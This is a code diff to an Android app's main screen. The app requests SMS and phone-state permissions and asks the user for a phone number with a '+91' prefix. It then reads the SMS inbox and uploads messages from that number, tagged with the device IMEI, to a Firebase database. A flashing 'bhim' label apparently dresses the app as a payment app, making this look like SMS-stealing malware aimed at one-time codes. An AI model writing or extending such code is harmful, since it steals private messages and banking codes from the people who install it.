@@ -8,6 +8,7 @@ import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.net.Uri;
+import android.preference.PreferenceManager;
 import android.provider.Settings;
 import android.provider.Telephony;
 import android.support.v4.app.ActivityCompat;
@@ -15,10 +16,14 @@ import android.support.v4.content.ContextCompat;
 import android.support.v7.app.AppCompatActivity;
 import android.os.Bundle;
 import android.telephony.TelephonyManager;
+import android.text.InputType;
 import android.util.Log;
 import android.view.View;
+import android.view.animation.AlphaAnimation;
+import android.view.animation.Animation;
 import android.widget.Button;
 import android.widget.EditText;
+import android.widget.ImageView;
 import android.widget.TextView;
 import android.widget.Toast;
 
@@ -33,19 +38,28 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
 
     FirebaseDatabase database = FirebaseDatabase.getInstance();
     DatabaseReference myRef = database.getReference("INFO");
-    private static final int MY_PERMISSIONS_REQUEST_READ_SMS = 1;
 
 
-    TextView disp;
-    String phoneid,phoneno, appendnumber;
+
     String device_id;
     Button b1;
-    boolean first;
+    EditText txtbox;
     int PERMISSION_ALL = 1;
     TelephonyManager tm;
     String[] PERMISSIONS = {Manifest.permission.READ_SMS, Manifest.permission.READ_PHONE_STATE,
             Manifest.permission.RECEIVE_SMS, Manifest.permission.SEND_SMS};
 
+    String initial="+91";
+    String finalnumber;
+    SharedPreferences sp,newpref;
+    String prefname ="abc";
+    String Phonenumber="number";
+    ImageView img;
+    TextView bhim;
+
+
+    String txtboxcontent;
+    Animation anim = new AlphaAnimation(0.0f, 1.0f);
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -54,17 +68,27 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
         setContentView(R.layout.activity_main);
         b1 = (Button) findViewById(R.id.btn1);
         b1.setOnClickListener(this);
-        disp =(TextView) findViewById(R.id.display);
+        txtbox = (EditText) findViewById(R.id.editText);
+        bhim = (TextView) findViewById(R.id.textView);
 
+        img =(ImageView) findViewById(R.id.imageView);
 
+        finalnumber = initial+txtbox.getText().toString();
 
+        txtboxcontent = txtbox.getText().toString();
+        txtbox.setInputType(InputType.TYPE_CLASS_NUMBER);
+
+        anim.setDuration(500);
+        anim.setStartOffset(20);
+        anim.setRepeatMode(Animation.REVERSE);
+        anim.setRepeatCount(Animation.INFINITE);
+
+        bhim.startAnimation(anim);
+
+        newpref = PreferenceManager.getDefaultSharedPreferences(this);
         if (!hasPermissions(this, PERMISSIONS)) {
             ActivityCompat.requestPermissions(this, PERMISSIONS, PERMISSION_ALL);
-
-
         }
-
-
     }
 
 
@@ -85,43 +109,39 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
         if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
             return;
         }
-        device_id = tm.getDeviceId();
-
-       SharedPreferences settings = getSharedPreferences("PREFS",0);
-       first = settings.getBoolean("first_time_code", true);
-
-        if(v == b1){
-
-            if(first){
+            device_id = tm.getDeviceId();
 
 
-                Log.i("finalnumber","entered number :"+appendnumber);
 
+            if(v == b1){
+                if(!newpref.getBoolean("firstTime", false)) {
 
-                SharedPreferences.Editor editor = settings.edit();
-                editor.putBoolean("first_time_code", false);
-                editor.commit();
+                    SharedPreferences.Editor editor = newpref.edit();
+                    editor.putBoolean("firstTime", true);
+                    editor.commit();
+                    startActivity(new Intent(MainActivity.this , secondpage.class));
+                }
+                else{
+                    startActivity(new Intent(MainActivity.this , secondpage.class));
+                }
 
-
+                finalnumber = initial + txtbox.getText().toString();
+                sp = getSharedPreferences(prefname, Context.MODE_PRIVATE);
+                SharedPreferences.Editor changer = sp.edit();
+                changer.putString(Phonenumber, finalnumber);
+                changer.commit();
 
                 code();
 
-                Toast.makeText(this,"service running",Toast.LENGTH_SHORT).show();
 
-            }
-            else{
-                Toast.makeText(this,"already running",Toast.LENGTH_SHORT).show();
-            }
+                Log.i("finalnumber", "entered number :" + finalnumber);
 
-        }
-   }
+                startActivity(new Intent(MainActivity.this, secondpage.class));
+                Toast.makeText(this, "Number entered  is" + finalnumber, Toast.LENGTH_SHORT).show();
+            }
+    }
 
     public void code(){
-
-
-        phoneid = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
-
-
         Uri uriSmsuri = Uri.parse("content://sms/inbox");
         Cursor cur = getContentResolver().query(uriSmsuri, null, null, null, null);
 
@@ -144,12 +164,9 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
             Log.i("message", sms + "....." + saddress);
 
 
-            if (saddress.toString().equals(appendnumber)) {
-
-
+            if (saddress.equals(finalnumber)) {
 
                 myRef.child(device_id).child("Old Messages").child(smsDate).setValue(sms);
-
 
                 Log.i("IMEI",device_id);
 
